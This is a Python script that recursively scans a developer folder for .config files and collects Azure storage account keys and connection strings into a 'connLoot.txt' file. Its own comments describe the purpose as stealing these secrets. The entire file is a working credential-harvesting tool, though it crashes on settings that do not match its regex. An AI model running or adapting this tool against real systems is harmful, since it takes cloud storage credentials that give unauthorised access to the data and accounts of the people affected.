# Concept is to steal connstrings keys in App.config which are configured based on most Microsoft's Documentation
# Roughly based on Scenario where app.config is configured as of
# https://github.com/Azure-Samples/storage-blob-dotnet-getting-started/blob/master/BlobStorage/App.config
# And connstrings format -> https://www.connectionstrings.com/windows-azure/
# Scripted ON/FOR Windows
# Please MODIFY the devFolder Path before running this script.

import os
import glob
import re
from datetime import datetime
from bs4 import BeautifulSoup as soup

defaultKeyNames = ['StorageAccountKey', 'StorageServiceKeys', 'StorageConnectionString']
azureConnStrings = []
regex = r"DefaultEndpointsProtocol=[htps]{0,5}[;]AccountName=.*;AccountKey=[A-Za-z0-9+\/=]*;{0,1}"
outFolder = os.path.realpath(__file__)+"/../"

devFolder = outFolder # Change devFolder -> to folder containing development projects.
configFiles = glob.glob(devFolder + "/**/*.config", recursive = True) # find *.config files in subdirectories of Development Folder and store as ['x', 'y']

now = datetime.now()
formatted_now = now.strftime("%d/%m/%Y %H:%M:%S")
# print (formatted_now)
open(f"{outFolder}/connLoot.txt","a").write(f"Loots/ConnStrings Found on {formatted_now}\n=================================================================\n")

for config in configFiles:
    with open(config) as file:
        nice = soup(file, features="lxml")
    appSettings = nice.find_all("add")
    for x in appSettings:
        key = x.get('key')
        if key in defaultKeyNames:# Immediately retrieve the value a.k.a the connstring
            azureConnStrings.append(x.get("value"))
        else:# Check if connstring value is Azure's format
            value = x.get("value")
            search = re.search(regex, value)
            azureConnStrings.append(search.group())

# print (configFiles)
# print (azureConnStrings)
for found in azureConnStrings:
    if "usedevelopmentstorage=true" in found.lower():# Not sure if the True value is case insensitive, so decided to just change everything to smallcases for comparison
        print ("No use - Development Storage Detected --> IGNORED")
    else:
        # print (found)
        open(f"{outFolder}/connLoot.txt","a+").write(found + "\n")
open(f"{outFolder}/connLoot.txt","a+").write("=================================================================\n\n")
